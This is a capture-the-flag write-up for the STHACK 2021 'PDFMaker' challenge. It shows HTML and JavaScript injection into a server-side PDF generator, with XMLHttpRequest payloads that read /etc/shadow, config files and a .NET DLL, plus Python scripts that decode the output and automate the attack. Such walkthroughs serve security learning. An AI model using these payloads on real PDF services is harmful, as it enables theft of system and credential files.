# Introduction

During the [STHACK 2021](https://sthack.fr) (CTF event \@Bordeaux
France), [Mayfly](https://twitter.com/m4yfly) has created few web
challenges including the **PDFMaker**.

We did block few (lost) hours on the exploitation part of the
vulnerability, even if we thought many times that we got the good
library needed to solve the challenge (you'll see what I am talking
about). After few analysis and talks with mayfly, I understood what was
the issue related to the wrong rebuild of the .dll. Working on it after
the CTF, we thought that it would be a good idea to release a Write-Up
and share it with the community.

Here we go!

# Recon

## Main feature

We get a page asking for our input to write into a "PDF generated on the
fly and not stored on the hard drive\".

Example:

![aaa](img/testpdf.png)

We get the following output:

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput.png)

## Technology to create PDF

Analyzing the Burp response's server, we get this:

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput5.png)

We know that it uses **HtmlToPdf** which mean that we may be able to
execute some HTML and JavaScript code.

Moreover, we notice by reading the response server that it uses
**Kestrel** as server. A quick research on it let us understand that the
application may be developed in **.NET Core**.

## Code source of the main web page

Reading the source code of the application, we see this comment:

``` {.wp-block-syntaxhighlighter-code .code}
<!-- mono asp.net MVC application /app -->
```

It may be the absolute path of the application.

# Trig the vulnerability

We inject some HTML code like:

``` {.wp-block-syntaxhighlighter-code .code}
<b>test</b>
```

Which seems to be interpreted:

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput2.png)

Then we try some JavaScript injection:

``` {.wp-block-syntaxhighlighter-code .code}
<script>document.write("A");</script>
```

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput3.png)

We get the \"A\" letter written. **The JavaScript is executed!**

We try to read system files using XHR (XmlHttpRequest) as mentionned in
this [link from
blog.noob.ninja](https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/):

``` {.wp-block-syntaxhighlighter-code .code}
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/shadow");
    x.send();
</script>
```

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput4.png)

This will give us the output of the /etc/shadow file telling us that the
application is running as root and then that we can leak some system
files.

# Exploitation

We know what is the vulnerability but we need to find and understand
what do we need to retrieve from the application in order to dig into
the server's sensitive files.

As we may be on a .Net Core application, we need to find what are the
default config files:

Reading the [Microsoft
documentation](https://docs.microsoft.com/fr-fr/aspnet/core/fundamentals/configuration/?view=aspnetcore-5.0),
we noticed some default configuration files including the
**appsettings.json** may be reachable from the application.

``` {.wp-block-syntaxhighlighter-code .code}
<script>     
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///app/appsettings.json"); // The /app comes from the recon by reading the source code of the .html file
    x.send();
</script>
```

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput6.png)

The output confirms that we face a .NET Core application and that the
path is /app.

Reading the documentation we see that the web configuration file is
web.config thus we give it a try but got a blank page!

After some other tries, we understand that the content of the file may
interfere with the rendering into the PDF file. We need to find a way to
write the content other than rewriting the content directly into the
PDF.

We can encode our output, then write it into the PDF using this payload:

``` {.wp-block-syntaxhighlighter-code .code}
<script>

var oReq = new XMLHttpRequest();
oReq.onload = function(oEvent) {
        document.write(encodeURI(this.response));
};
oReq.open("GET", "file:///app/web.config");
oReq.send(null);
</script>
```

We try to retrieve the content of the /app/web.config file, encode it,
and write the output into the PDF.

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput10.png)

We can extract the content of the PDF file using python:

``` {.wp-block-syntaxhighlighter-code .code}
#!/usr/bin/env python3

from tika import parser # pip install tika
from urllib.parse import unquote

raw = parser.from_file('Test.pdf')
content = raw['content']

with open("web.config", 'w') as fichier:
    fichier.write(unquote(content))
```

We get the following output:

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput8-1024x164.png)

The **OnlinePdfMarker.dll** file on ./ got our attention. We try to
retrieve it using the same method:

1.  JavaScript getting the /app/OnlinePdfMaker.dll and URI encoding it
2.  Get the PDF file and get the data from it
3.  Observe that it is kind of broken as the file command give us the
    output : **OnlinePdfMaker.dll: MS-DOS executable** and not an
    assembly file.

We seem to have some issues with the content of the .dll file. We need
to write it in a binary mode first.

The python script is now the following:

``` {.wp-block-syntaxhighlighter-code .code}
#!/usr/bin/env python3

from tika import parser # pip install tika
from binascii import unhexlify
from urllib.parse import unquote

raw = parser.from_file('Test.pdf')
content = ''.join(raw['content'].strip('\n').split('Created')[0].split('\n')[:-2])

with open("OnlinePdfMaker.dll", 'wb') as fichier:
    fichier.write(unhexlify(content))
    ficher.close()
```

We get an error that: **binascii.Error: Non-hexadecimal digit found**
meaning that:

-   We need to rethink the JavaScript payload
-   Search a method to get the .dll (in a binary mode)
-   Get a working function to convert the data into hexadecimal instead
    of Encode URI it

It leads to the following script:

``` {.wp-block-syntaxhighlighter-code .code}
<script>

//Function buf2hex convert the buffer into hexadecimal
function buf2hex(buffer) {
        var byteArray = new Uint8Array(buffer);
        var hexParts = [];
        for(var i = 0; i < byteArray.byteLength; i++) {
                var hex = byteArray[i].toString(16);
                var paddedHex = ('00' + hex).slice(-2);
                hexParts.push(paddedHex);
        }
        return hexParts.join('');
};

var oReq = new XMLHttpRequest();
oReq.onload = function(oEvent) {
        var buffer = oReq.response;
        document.write(buf2hex(buffer));
};

oReq.open("GET", "file:///app/OnlinePdfMaker.dll", true);
oReq.responseType = "arraybuffer"; //Important in order to get binary data
oReq.send();
</script>
```

![](https://www.opencyber.com/wp-content/uploads/2021/10/testpdfoutput9.png)

Ok, to be honest, this step made [my teammate](https://twitter.com/g0h4n_0) and I crazy! We were able to get
many .dll file but still not working in DnSpy for the end of the
challenge until we decided to ... **RTFM**.

The **arraybuffer** is very important as shown in the [Firefox
documentation](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Sending_and_Receiving_Binary_Data).
Without it, you will not get anything from the .dll as it contains not
printable chars!

Anyway, lets continue and get the .dll file using the new JavaScript
payload.

We execute the Python script:

``` {.wp-block-syntaxhighlighter-code .code}
#!/usr/bin/env python3

from tika import parser # pip install tika
from binascii import unhexlify
from shutil import copyfileobj
from urllib.parse import unquote

raw = parser.from_file('Test.pdf')
content = ''.join(raw['content'].strip('\n').split('Created')[0].split('\n')[:-2])
print(content)

with open("OnlinePdfMaker.dll", 'wb') as fichier:
    fichier.write(unhexlify(content))
    fichier.close()
```

Then we finally get a valid file:

``` {.wp-block-syntaxhighlighter-code .code}
OnlinePdfMaker.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

# Analysis of the library

Lets open this beautiful .dll in DnSpy:

![](https://www.opencyber.com/wp-content/uploads/2021/10/dll.png)

``` {.wp-block-syntaxhighlighter-code .code}
public IActionResult Index(string txtValue, string keyValue)
        {
            string s = "FBMqE3MvFDkUGDM4MVUdFgAwAEA0Cj4SbwEGAQA3B1c6QhE7CAg6";
            string text = "VGhlRmxhZ0lzU29tZXdoZXJlX3VzZV95b3VyX2JyYWlu";
            text = string.Concat(new string[]
            {
                text.Substring(1, 1),
                text.Substring(1, 1),
                text.Substring(32, 1),
                text.Substring(4, 1),
                text.Substring(9, 1)
            });
            text += Encoding.Default.GetString(Convert.FromBase64String("ZG9uJ3RfZ3Vlc3NfbG9va19hdF90aGVfY29kZSEhXzsp"));
            string str2;
            if (string.Equals(keyValue, text))
            {
                string str = EncryptModel.XORCipher(Encoding.Default.GetString(Convert.FromBase64String(s)), text);
                str2 = "flag : " + str;
            }
            else if (keyValue == null || keyValue.Equals(""))
            {
                str2 = "";
            }
            else
            {
                str2 = "Wrong key";
            }
```

There are some code to understand but at the end it does just a XOR
between two hexadecimal values.

# Get the flag (after the CTF)

We rewrite the code in python and get the flag:

``` {.wp-block-syntaxhighlighter-code .code}
#!/usr/bin/env python3

import base64

def bxor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

s = "FBMqE3MvFDkUGDM4MVUdFgAwAEA0Cj4SbwEGAQA3B1c6QhE7CAg6"
text = "VGhlRmxhZ0lzU29tZXdoZXJlX3VzZV95b3VyX2JyYWlu"

text1 = text[1:2] + text[1:2] + text[32:33] + text[4:5] + text[9:10]
text2 = base64.b64decode("ZG9uJ3RfZ3Vlc3NfbG9va19hdF90aGVfY29kZSEhXzsp")
text_final = text1 + text2.decode('utf-8')

flag = bxor(base64.b64decode(s), text_final.encode())
print(flag)
```

Executing it:

``` {.wp-block-syntaxhighlighter-code .code}
STHACK{W3ll_D0ne_\o/_U_f0und_Th3_c0d3!}
```

Thanks Mayfly for the challenge and the STHACK for the event!

# Exploit Python code

This following code automate the request with the JavaScript, get the
content of the Test.pdf file and rewrite the .dll directly.

``` {.wp-block-syntaxhighlighter-code .code}
#!/usr/bin/env python3

from tika import parser # pip install tika
from binascii import unhexlify
from requests import post
from shutil import copyfileobj
import logging

#LOGGING
logging.basicConfig(level=logging.INFO)

#CONSTANTS
URL = "http://localhost"
PROXY = {'http':'http://localhost:8080','https':'http://localhost:8080'}
HEADERS = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":"22"
}

#STEP 1: Request the PDFMaker
payload = "txtValue=%3Cscript%3E++function+buf2hex%28buffer%29+%7B+++++++++var+byteArray+%3D+new+Uint8Array%28buffer%29%3B+++++++++var+hexParts+%3D+%5B%5D%3B+++++++++for%28var+i+%3D+0%3B+i+%3C+byteArray.byteLength%3B+i%2B%2B%29+%7B+++++++++++++++++var+hex+%3D+byteArray%5Bi%5D.toString%2816%29%3B+++++++++++++++++var+paddedHex+%3D+%28%2700%27+%2B+hex%29.slice%28-2%29%3B+++++++++++++++++hexParts.push%28paddedHex%29%3B+++++++++%7D+++++++++return+hexParts.join%28%27%27%29%3B+%7D%3B++var+oReq+%3D+new+XMLHttpRequest%28%29%3B+oReq.onload+%3D+function%28oEvent%29+%7B+++++++++var+buffer+%3D+oReq.response%3B+++++++++document.write%28buf2hex%28buffer%29%29%3B+%7D%3B++oReq.open%28%22GET%22%2C+%22file%3A%2F%2F%2Fapp%2FOnlinePdfMaker.dll%22%2C+true%29%3B+oReq.responseType+%3D+%22arraybuffer%22%3B+oReq.send%28%29%3B++%3C%2Fscript%3E&keyValue="

req = post(URL,data=payload,headers=HEADERS,proxies=PROXY,stream=True)

with open("Test.pdf","wb") as out:
        req.raw.decode_content = True
        copyfileobj(req.raw,out)
        logging.info("File Test.pdf downloaded")

#STEP 2: Get the data from the PDF
raw = parser.from_file('Test.pdf')
content = raw['content']
content_bis = ""
#Remove the junk
data_hexa =  ''.join(raw['content'].strip('\n').split('\n')[0])
logging.info("Parsing of data from the Test.pdf file done")

#STEP 3: Write the data into the .dll file
with open("OnlinePdfMaker.dll", 'wb') as fichier:
    fichier.write(unhexlify(data_hexa))
    logging.info("Data written into OnlinePdfMaker.dll")

logging.info("Open the DLL file into DnSpy")
```
